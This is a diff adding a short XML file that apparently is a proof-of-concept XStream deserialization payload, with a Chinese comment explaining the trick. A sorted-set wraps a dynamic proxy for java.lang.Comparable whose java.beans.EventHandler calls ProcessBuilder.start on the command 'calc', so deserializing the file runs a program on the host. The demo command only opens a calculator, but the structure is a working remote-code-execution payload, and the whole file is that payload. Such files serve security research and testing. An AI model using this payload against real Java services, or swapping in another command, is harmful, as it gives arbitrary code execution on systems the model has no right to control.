@@ -1,0 +1,13 @@
+<sorted-set>
+    <dynamic-proxy> <!-- Proxy 动态代理，handler使用EventHandler -->
+        <interface>java.lang.Comparable</interface>
+        <handler class="java.beans.EventHandler">
+            <target class="java.lang.ProcessBuilder">
+                <command>
+                    <string>calc</string>
+                </command>
+            </target>
+            <action>start</action>
+        </handler>
+    </dynamic-proxy>
+</sorted-set>
